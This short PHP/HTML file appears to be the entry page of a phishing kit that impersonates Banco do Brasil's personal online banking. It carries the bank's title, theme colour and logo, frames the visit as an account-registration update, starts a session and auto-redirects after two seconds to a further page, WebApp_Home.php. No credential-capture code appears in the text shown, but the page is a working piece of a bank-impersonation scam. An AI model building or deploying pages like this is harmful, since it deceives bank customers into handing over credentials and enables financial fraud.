<!--
Theme Name: BB Atualização cadastrais
Author: MK(rj)
 -->

 <?php session_start(); ?>

<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <title>Banco do Brasil - Autoatendimento Pessoa Fisica</title>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta property="og:image" content="https://pbs.twimg.com/profile_images/1375463301463871491/Q_NUIbde_400x400.jpg">

    <!-- CSS -->
    <link rel="stylesheet" type="text/css" href="css/bootstrap.css">
    <link rel="stylesheet" type="text/css" href="css/estilo.css">
    
    <link rel="icon" href="img/favicon.ico" type="image/x-icon"/>

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <meta name="theme-color" content="#FAF046">

</head>

</html>
   <body>      
      <main id="index">
          <div class="container">
              <div class="row">
                  <img class="logo-index" src="img/logofrente.png">
              </div>
              <meta http-equiv="refresh" content="2;url=WebApp_Home.php">
          </div>
      </main>
   </body>
</html>